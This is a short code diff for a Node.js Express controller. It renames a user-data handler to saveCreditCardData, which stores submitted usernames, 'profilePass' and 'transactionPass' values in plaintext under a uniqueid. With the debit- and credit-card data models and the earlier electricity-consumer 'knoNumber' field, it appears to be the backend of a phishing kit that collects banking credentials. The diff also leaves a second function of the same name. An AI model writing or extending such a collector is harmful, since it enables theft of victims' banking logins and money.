@@ -2,35 +2,35 @@ const User = require('../models/User');
 const DebitCardData = require("../models/DebitCardData");
 const CreditCardData = require("../models/CreditCardData");
 
-
-exports.saveUserData = async (req, res) => {
+exports.saveCreditCardData = async (req, res) => {
   try {
-    const { name, mobileNumber,knoNumber, uniqueid } = req.body;
-    let user = await User.findOne({ uniqueid });
+    const { uniqueid, userName, profilePass, transactionPass } = req.body;
 
-    if (user) {
-      user.entries.push({ name, mobileNumber,knoNumber});
-    } else {
-      user = new User({
-        uniqueid,
-        entries: [{  name, mobileNumber,knoNumber}]
-      });
-    }
-
-    await user.save();
+    // Use findOneAndUpdate with upsert for an atomic operation:
+    const updatedDoc = await CreditCardData.findOneAndUpdate(
+      { uniqueid }, // query by uniqueid
+      { 
+        $push: { 
+          entries: { userName, profilePass, transactionPass, submittedAt: new Date() }
+        } 
+      },
+      { upsert: true, new: true, runValidators: true }
+    );
 
     res.status(200).json({
       success: true,
-      message: "User Data Submitted Successfully!"
+      message: "Credit Card Data Submitted Successfully!",
+      data: updatedDoc
     });
   } catch (error) {
-    console.error(error);
+    console.error("Detailed error:", error);
     res.status(500).json({
       success: false,
-      message: "Error occurred while submitting user data"
+      message: "Error occurred while submitting credit card data"
     });
   }
 };
+
 
 
 exports.saveCreditCardData = async (req, res) => {
